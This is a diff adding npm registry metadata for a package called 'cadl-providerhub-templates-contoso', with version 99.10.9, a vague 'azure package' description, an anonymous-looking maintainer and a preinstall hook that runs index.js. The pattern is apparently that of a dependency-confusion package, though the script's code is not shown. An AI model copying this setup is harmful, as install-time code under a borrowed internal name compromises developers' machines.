@@ -1,0 +1,62 @@
+{
+    "_id": "cadl-providerhub-templates-contoso",
+    "name": "cadl-providerhub-templates-contoso",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "cadl-providerhub-templates-contoso",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "cadl-providerhub-templates-contoso@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-eLnPFN3gaHucW4sAfEcpuCA4PevkPvobwdLrEWt/DBKi0rrA1b19sAV31U/2PxhH4qYtbqzjQjzX/3lkgcPKBQ==",
+                "shasum": "98d1165d985dd72b22591407ab8c277577281196",
+                "tarball": "https://registry.npmjs.org/cadl-providerhub-templates-contoso/-/cadl-providerhub-templates-contoso-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5086,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiN3gMACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmp46Q/+LJoX43Ci0qvuzSGW5hVqdHZJxEOGQV4IyC03uOC3qyYFr3NE\r\nwyne6RZzPfU8dw3OVHQ+HufsYZZI5V+BpFxu+tyXOw/02goDDBvHzlWePds4\r\nTlLCA+x90LiCECa3VAl91DTDBle5a5zRSBGayi5K5s4BCgpcGAVIhAaMIY/e\r\njwUGPqwnI/3FQROPKXtmd7nrxz9WvpcMinUdGc/jS4iJD4qgqHI7H2aYPHrj\r\n1JzTrfEt1MOuc3v/gnt61e8GaZKjTuwp2o2vAw4Od8asqGJPFgvqWaHJVW5r\r\nRyYSemuYNmu9gOH4x5P6ggi/x0/O7O5W7wCwNLqCI6xs5VtKckvhNiaCnaX0\r\nG4dFVPTWjQpfjKAP25I5+PUYppW3If824mcA/4vGel03zRLR+XLCnedihnjP\r\nCvykwed1DZ5G1FPxDbWnc9br7H68yl5EQQz3relvdpfZnbd1+rwGvhoI7e/M\r\n8PBgoQGS1Ht/eujtdQxGtrgiSLK2lA4dGsPtAkDNHgR1Zfg8FyTD+0MW4vqz\r\n58ZpiQXUirTRFlkr2AGvl7Cl/kwAe5NyXBBD49N66E28YO8Ex3Re8m8UI5xS\r\nSDVfv2Pj9+LFimzj2v6rIBcwcy4DcbD85OJ+gwpskYn3yeQCY9Lupc0aaH9P\r\n7BGZpYWIY372UHF4xCAPSIS2OkK+uc6CUDM=\r\n=TNqJ\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "x5vys8w0",
+                "email": "x5vys8w0@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "x5vys8w0",
+                    "email": "x5vys8w0@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/cadl-providerhub-templates-contoso_99.10.9_1647802379905_0.4533353358861283"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-20T18:52:59.905Z",
+        "99.10.9": "2022-03-20T18:53:00.070Z",
+        "modified": "2022-03-20T18:53:00.160Z"
+    },
+    "maintainers": [
+        {
+            "name": "x5vys8w0",
+            "email": "x5vys8w0@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
